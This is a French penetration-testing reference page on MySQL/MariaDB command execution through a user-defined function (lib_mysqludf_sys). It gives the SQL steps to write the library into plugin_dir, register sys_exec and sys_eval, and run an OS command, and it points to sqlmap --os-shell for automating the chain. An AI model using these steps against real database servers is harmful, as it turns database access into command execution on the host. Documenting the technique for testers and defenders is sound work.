---
title: "Exécution de commandes MySQL : fonctions définies par l'utilisateur"
description: "Exécuter des commandes du système d'exploitation depuis MySQL ou MariaDB sous le compte de service en installant une fonction définie par l'utilisateur (lib_mysqludf_sys) dans le répertoire de plugins, la voie standard de l'accès à la base vers le code sur l'hôte."
keywords:
  - fonction définie par l'utilisateur
  - lib_mysqludf_sys
  - plugin_dir
  - MySQL RCE
  - sys_exec
---

# Exécution de commandes

MySQL n'a pas de shell de commandes intégré, l'exécution passe donc par une **fonction définie par l'utilisateur (UDF)** : une bibliothèque partagée placée dans le répertoire de plugins du serveur et enregistrée comme fonction SQL qui exécute des commandes OS. La bibliothèque classique est `lib_mysqludf_sys`, exposant `sys_exec` et `sys_eval`.

## Installer l'UDF

Les prérequis sont le privilège **`FILE`** (ou `INSERT` sur `mysql`) et un **`@@plugin_dir`** accessible en écriture :

```sql
SELECT @@plugin_dir;                       -- where the library must land
-- write the platform library into the plugin dir (see file access for the write primitive)
SELECT 0xMACHINECODE INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('id');
```

## Notes d'exploitation

- Les commandes s'exécutent sous le **compte de service MySQL** (`mysql` sur la plupart des hôtes Linux), c'est donc un accès à l'hôte en tant que cet utilisateur et un point de pivot, pas généralement root directement.
- La bibliothèque doit correspondre à la plateforme du serveur et être écrite dans `@@plugin_dir`, ce qui repose sur la primitive d'[écriture de fichier](file-access.md), les deux techniques s'enchaînent donc.
- `sqlmap --os-shell` automatise tout le chemin UDF (écrire la bibliothèque, enregistrer les fonctions, exécuter les commandes) et est la voie la plus rapide en pratique.
- Sous MySQL Windows, la même approche UDF s'applique avec un `.dll` et typiquement un compte de service plus privilégié.

## Outils

- **sqlmap** (`--os-shell`, `--os-cmd`) : téléversement d'UDF et exécution de commandes automatisés.
- **lib_mysqludf_sys** : la bibliothèque UDF fournissant `sys_exec`/`sys_eval`.
- **mysql** : exécuter directement les instructions `CREATE FUNCTION`.

## Références

- [HackTricks: MySQL UDF command execution](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html)
- [lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)
- [PayloadsAllTheThings: MySQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
